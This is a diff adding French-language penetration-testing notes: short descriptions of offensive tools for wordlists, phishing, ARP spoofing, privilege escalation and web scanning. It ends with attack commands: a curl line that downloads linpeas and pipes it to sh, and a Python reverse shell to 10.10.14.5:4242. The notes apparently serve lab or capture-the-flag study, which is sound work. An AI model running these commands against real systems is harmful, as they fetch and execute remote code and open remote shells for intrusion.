@@ -16,6 +16,59 @@ Reconnaissance passive => Metagoofil
 
 yersinia => Pour les protocoles de communication (Cisco et autre)
 
+CRUNSH : DICO + SEL
+
+CUPP : Création de dico en fonction des noms données
+
+Setoolkit : Social Ingénieuring (copie de site pour récupérer les URL)
+
+hashid : donne le type de hash d'un hash
+
+arpspoof : recupere les requetes ARP et les transmets (man in the middle)
+
+exiftool : metadata du fichier
+
+hexdump : (-C) transformation en hexa du fichier bin
+
+powershell-empire : comme metaspote, exploit windows
+
+recon-ng : Framework de reconnaissance passive (avec API)
+
+Discover : Framework de reconnaissance passive (avec API) + recon ng + google dorks
+
+pypykatz / Empire : Check des fichiers pour monter les privilèges WINDOWS
+
+linuxprivchecker et linpeas : Check des fichiers pour monter les privilèges LINUX
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+
+Steghide : Extraction de fichier a partir d'un autre fichier et passphrase
+
+
+
+-----WEB------
+
+Nikto : Pentest Web -> check une URL
+
+dirb : brute force pour trouvé des pages web ou des dossiers
+
+zaproxy : Nessus pour le web (scan les vulnérabilitées)
+
+wpscan : scan wordpress -> Puissant
+
+curl : requete vers site web
+
+droopescan : Scan de site Drupal (comme Wpscan pour workPress)
+
+Cewl : récupere les mots d'un site et fait un dico pour brute force
+
+--------------
+
+Avoir un shell :
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+export RHOST="10.10.14.5";export RPORT=4242;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+
 # BRUTE FORCE
 Avec Hydra :
 ```
